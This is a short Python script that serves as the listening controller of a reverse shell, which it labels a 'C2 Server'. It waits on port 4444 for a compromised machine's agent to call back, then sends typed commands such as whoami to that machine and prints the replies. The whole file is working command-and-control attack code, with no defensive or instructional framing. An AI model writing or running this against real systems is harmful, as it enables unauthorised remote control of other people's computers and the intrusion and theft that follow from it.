import socket

# Configuration
LHOST = '0.0.0.0' # Listen on all network interfaces
LPORT = 4444      # The port the agent will call back to

def start_controller():
    # Create a socket and bind it to the port
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((LHOST, LPORT))
    listener.listen(1)
    
    print(f"[*] C2 Server Active. Waiting for connection on port {LPORT}...")
    
    client, addr = listener.accept()
    print(f"[*] CONNECTION ESTABLISHED FROM: {addr[0]}")
    
    # Receive the initial prompt
    print(client.recv(1024).decode())

    while True:
        try:
            # Type a command (e.g., 'dir', 'whoami', 'hostname')
            cmd = input("RemoteShell> ")
            if cmd.lower() in ['exit', 'quit']:
                client.close()
                break
            
            if len(cmd) > 0:
                client.send(cmd.encode())
                response = client.recv(4096).decode()
                print(response)
        except KeyboardInterrupt:
            client.close()
            break

if __name__ == "__main__":
    start_controller()
